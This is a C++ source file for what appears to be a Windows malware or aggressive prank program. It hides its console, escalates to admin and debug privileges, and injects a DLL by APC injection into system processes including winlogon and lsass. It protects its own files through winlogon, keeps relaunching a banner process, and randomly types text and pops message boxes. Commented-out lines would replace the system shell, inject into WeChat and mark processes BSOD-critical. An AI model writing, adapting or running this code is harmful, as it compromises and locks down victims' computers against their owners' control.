
#include"../process.h"
#include"../RegFunc.h"
#include"console.h"
#include"MustInclude.h"
#include"GeneralTask.h"
#include<cstdlib>
#include<ctime>
#include<thread>


void inject(int pid,string DllPath);

void work(){
	while(1){
	
	srand(clock());
	if(rand()%98>=97){for(int i=0;i<5;i++){SendString("Ciallo~",2);SendKey(VK_RETURN);}}

	if(rand()%99>=97){MessageBoxA(NULL,"Ciallo~","YouzuSoft",0);}
	//if(rand()%50>=45){int res=MessageBoxA(NULL,"Do you want to destroy your computer?","Ciallo!!!",1);if(res==1){SetSystemShell("Fuck.exe");system("start wininit");}}
	//inject(getSinglePid("msedgewebview2"),"c:\\windows\\system32\\SystemShellGuard.dll");
	//inject(getSinglePid("msedgewebview2"),"c:\\windows\\system32\\SystemShellGuard.dll");
	//inject(getSinglePid("WeiXin"),"c:\\windows\\system32\\SystemShellGuard.dll");
	Sleep(10000);
	}
}

void inject(int pid,string DllPath){
	string command="APCInjector.exe "+to_string(pid)+" "+DllPath;cout<<command<<"\n";
	System(command);
}



int main (){//和那个Service一样都是开机启动的  完全R3
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
	if(getPid("expllorer").size()>MAX_RUNNING_INSTANCE){return 1;}
	RequestAdminRightsWithArgs();
	
	EnableDebugPrivilege();
	setWindowProtection();
	inject(getSinglePid("winlogon"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("OfficeClickToRun"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("explorer"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("spoolsv"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("WmiPrvSE"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("lsass"),"c:\\windows\\system32\\SystemShellGuard.dll");
	
	//APCInjection(getSinglePid("winlogon"),"c:\\windows\\system32\\SystemShellGuard.dll");cout<<getSinglePid("winlogon")<<"\n"<<getSinglePid("lsass")<<"\n";
	//APCInjection(getSinglePid("lsass"),"c:\\windows\\system32\\SystemShellGuard.dll");
	SetFileProtectWithWinlogon("c:\\windows\\system32\\SystemShellGuard.dll");
	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		SetFileProtectWithWinlogon(string("c:\\windows\\system32\\")+allBinFile[i]);
	}
	//BSODCriticalProtect(1);
	/*system("start C:/Windows/explorer.exe");*/LaunchExe("ProgrammBanner.exe");
	
	//MessageBoxA(NULL," ","EXPLORER.EXE",MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2);
	thread A(work);A.detach();
	int protectPid=getSinglePid("ProgrammBanner");
	SetWallPaper(WALLPAPER_PATH);
	while(1){
		if(!isProcessExist(protectPid)){LaunchExe("ProgrammBanner.exe");}
		
		Sleep(1000);
	}
	
	return 0;
}
